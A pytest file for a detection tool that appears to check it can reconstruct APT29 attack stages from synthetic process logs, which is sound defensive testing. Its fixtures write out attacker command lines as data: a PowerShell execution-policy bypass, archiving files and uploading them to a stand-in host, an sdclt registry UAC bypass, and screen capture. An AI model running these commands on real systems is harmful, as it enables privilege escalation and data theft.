from __future__ import annotations

import json
import os
import zipfile
from pathlib import Path

import pytest


def test_apt29_stage_reconstruction_on_synthetic_zip(tmp_path):
    from regression.external_apt_dataset import validate_apt29_dataset

    events = [
        _proc("2023-01-01T00:00:01Z", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\Public\\splunkd.exe", "powershell.exe -ExecutionPolicy Bypass -C run"),
        _proc("2023-01-01T00:00:02Z", "C:\\Windows\\System32\\systeminfo.exe", "C:\\Windows\\System32\\cmd.exe", "systeminfo"),
        _proc("2023-01-01T00:00:03Z", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\Public\\splunkd.exe", "Compress-Archive -DestinationPath $env:APPDATA\\Draft.Zip"),
        _proc("2023-01-01T00:00:04Z", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\Public\\splunkd.exe", "Invoke-MultipartFormDataUpload -Uri http://example/file/upload"),
        _proc("2023-01-01T00:00:05Z", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\Public\\splunkd.exe", "Set-ItemProperty HKCU:\\Software\\Classes\\Folder\\shell\\open\\command DelegateExecute; sdclt.exe"),
        _proc("2023-01-01T00:00:06Z", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\Public\\splunkd.exe", "iwr https://download.sysinternals.com/files/SysInternalsSuite.zip -outfile SysInternalsSuite.zip"),
        _proc("2023-01-01T00:00:07Z", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\Public\\splunkd.exe", "Invoke-ScreenCapture"),
        _proc("2023-01-01T00:00:08Z", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Users\\Public\\splunkd.exe", "Remove-Item upload.ps1; Remove-Job -Name Screenshot"),
    ]
    archive = tmp_path / "apt29.json.zip"
    with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("apt29.json", "\n".join(json.dumps(e) for e in events))

    result = validate_apt29_dataset(archive, use_cache=False)

    assert result["ok"] is True
    assert result["detected_stage_count"] == result["expected_stage_count"]
    assert result["bias_evaluation"]["ok"] is True


def test_external_apt29_dataset_if_enabled():
    if os.environ.get("FW_RUN_LARGE_APT_VALIDATION") != "1":
        pytest.skip("Set FW_RUN_LARGE_APT_VALIDATION=1 to scan the full APT29 dataset")
    path = Path("external/dfir_validation/apt29.json.zip")
    if not path.exists():
        pytest.skip("APT29 dataset not downloaded")

    from regression.external_apt_dataset import validate_apt29_dataset

    result = validate_apt29_dataset(path)
    assert result["ok"] is True
    assert not result["missed_stages"]


def _proc(timestamp: str, image: str, parent: str, command: str) -> dict:
    return {
        "timestamp": timestamp,
        "action": "CREATE",
        "object": "PROCESS",
        "pid": 1,
        "ppid": 2,
        "properties": {
            "image_path": image,
            "parent_image_path": parent,
            "command_line": command,
        },
    }
